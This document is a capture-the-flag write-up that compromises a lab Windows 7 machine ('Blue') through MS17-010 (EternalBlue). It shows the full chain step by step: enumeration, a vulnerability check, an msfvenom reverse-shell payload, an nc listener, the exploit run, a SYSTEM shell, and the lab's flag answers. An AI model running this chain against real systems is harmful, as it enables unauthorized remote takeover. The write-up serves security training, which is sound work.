Running our `nmap` scan

```php
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

We do see SMB so lets investigate, what SMB shares we can find on blue

```php
smbclient -L \\\\10.129.9.241\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk 
```

We find 5 shares currently present

We do know that there is a famous windows 7 exploit, `MS17-010`
We're gonna exploit this manually, no metasploit

```php
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```

Lets just run the checker script to verify that blue is vulnerable to `MS17-010`

```python
python eternal_checker.py 10.129.9.241

[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
```

We're all good to go, lets get to hacking
Lets develop a payload to establish a reverse shell on port 4444 that we will be waiting on.

```php
msfvenom -p windows/shell_reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe > shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.209 LPORT=4444 -f exe > shell.exe
```

In the exploit we downloaded there is a script to help us generate a shell payload
```
./shell_prep.sh
```

We provide it with our IP and the port it will connect to, `sc_x64.bin`

Lets setup a listener too for port 4444

```php
nc -nvlp 4444
Listening on 0.0.0.0 4444
```

Now we run the Eternal Blue exploit script, specifically the one meant for windows 7 machines while also providing it the `shell.exe` payload we generated

```php
python eternalblue_exploit7.py 10.129.9.241 shellcode/sc_x64.bin
```

We have gained a shell

```php
Connection received on 10.129.9.241 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

And on this shell have system authority

```php
C:\Windows\system32>whoami
nt authority\system
```

Lets check how many users we have on this machine

```php
cd C:\Users
dir

21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
```

Lets navigate to the Desktop for `haris` and `Administrator` for the flags

User Flag: `60554c5ee6550115efd18163c692747e`
Root Flag: `bf5600fb6ef57348a523ba507769ec0e`

